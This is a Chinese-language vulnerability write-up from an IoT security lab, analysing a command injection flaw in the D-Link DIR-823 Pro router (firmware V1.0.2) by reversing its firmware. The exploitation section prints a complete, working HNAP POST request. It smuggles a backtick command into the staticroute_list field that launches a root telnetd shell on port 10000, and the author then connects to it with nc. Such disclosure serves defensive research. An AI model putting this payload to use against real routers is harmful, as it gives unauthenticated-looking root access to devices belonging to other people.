# D-Link DIR-823 Pro命令执行
> 0431物联卫士实验室
> 来源：https://www.iotsec-zone.com/article/128

## 0x00.前言

- 受影响设备型号：D-Link DIR-823 Pro 
- 受影响版本：V1.0.2
- 固件下载地址：[http://support.dlink.com.cn:9000/ProductInfo.aspx?m=DIR-823+Pro](http://support.dlink.com.cn:9000/ProductInfo.aspx?m=DIR-823+Pro)

## 0x01.漏洞分析

使用`binwalk`提取固件
![0.png](https://www.iotsec-zone.com/images/MdImg/a81df18071bb529bbcd3417aef110122.png)

![1.png](https://www.iotsec-zone.com/images/MdImg/8b71a39c23c0f101556111eca5d3e603.png)

漏洞产生位置是设置静态路由时，未对输入的内容进行过滤，从而造成命令执行

这里我们查看对应的`HTML`源代码，这里可以清晰的看到发送的数据和请求的地址

![2.png](https://www.iotsec-zone.com/images/MdImg/43923ffd2b5375fecd617dde5b61f987.png)

根据请求地址进行搜索，查看负责处理请求的二进制应用

![3.png](https://www.iotsec-zone.com/images/MdImg/2513e26d6941ea224fe69fc5bb651fc8.png)

可以看到`prog.cgi`中包含`SetStaticRouteSettings`的接口，这里我们直接使用`IDA`进行逆向分析

![4.png](https://www.iotsec-zone.com/images/MdImg/32c7d05ec9d6e311db388b449ca5ab64.png)

可以看到对应的请求及处理函数，这里`SetStaticRouteSettings`路由的处理函数是`sub_43730C`，我们直接跟进

![5.png](https://www.iotsec-zone.com/images/MdImg/0a2e3ad48c5e51ed3638aeaa015ce144.png)

可以看到传递过来的`staticroute_list`对应的值，继续往下跟踪
![6.png](https://www.iotsec-zone.com/images/MdImg/607339b76ad3bd31e130699caa1fbf26.png)

可以看到根据逗号进行分割处理，将数据传递给触发漏洞的函数`sub_437028`，继续跟进

![7.png](https://www.iotsec-zone.com/images/MdImg/809002415021d4f4a0ed588b5c28e73f.png)

这里可以看到对传递过来的数据没有进行任何过滤，直接使用`sprintf`进行格式化拼接，由`FCGI_popen`进行处理，根据`popen`这个词，我们可以猜测这个函数会创建一个管道执行输入的命令

![8.png](https://www.iotsec-zone.com/images/MdImg/eda9c73a5ee9382eec82a21995ccf775.png)

查看`FCGI_popen`可以看到为导入函数，`FCGI_popen`位于导入表中，通过`grep`搜索

![9.png](https://www.iotsec-zone.com/images/MdImg/9b81ae8803f827d18aff57a8534c5864.png)

可以看到`FCGI_popen`位于`libfcgi.so.0.0.0`，接下来逆向分析对应的动态链接库

![10.png](https://www.iotsec-zone.com/images/MdImg/e4ef4feaafb27aa7198feb07d615aa70.png)

可以看到确实调用了`popen`创建管道来执行命令

## 0x02.漏洞利用

根据漏洞产生的原因，我们只需要使用逗号分割出三个地址和要执行的命令即可，最终构造的`EXP`如下

```http
POST /HNAP1/ HTTP/1.1
Host: 192.168.100.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0
Accept: application/json
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json
SOAPACTION: "http://purenetworks.com/HNAP1/SetStaticRouteSettings"
HNAP_AUTH: ************************************* # 根据用户的实际认证
Content-Length: 130
Origin: http://192.168.100.1
Connection: close
Referer: http://192.168.100.1/Staticroute.html
Cookie: work_mode=router; uid=KjSsMz7d; PrivateKey=************; timeout=218

{"SetStaticRouteSettings":{"staticroute_list":"192.168.1.1,255.255.255.255,192.168.0.1,`telnetd -l /bin/sh -p 10000 -b 0.0.0.0`"}} # `中添加要执行的命令
```

![11.png](https://www.iotsec-zone.com/images/image-20220421032217906.png)

可以看到发送成功，使用`nc`连接启动的`telnetd`服务![12.png](https://www.iotsec-zone.com/images/image-20220421032343504.png)

可以看到命令执行成功

### 0x03.总结

通过上述漏洞可以看到设备在设置网络层功能时，会调用`popen`执行设置网络的命令，`popen`命令往往根据用户的输入进行格式化拼接，如果对输入的内容没有进行严格过滤，则很容易造成命令执行，并且由于只有`root`权限才能配置网络服务，所以，这时获取的`shell`就是最高权限的，不需要进行提权操作
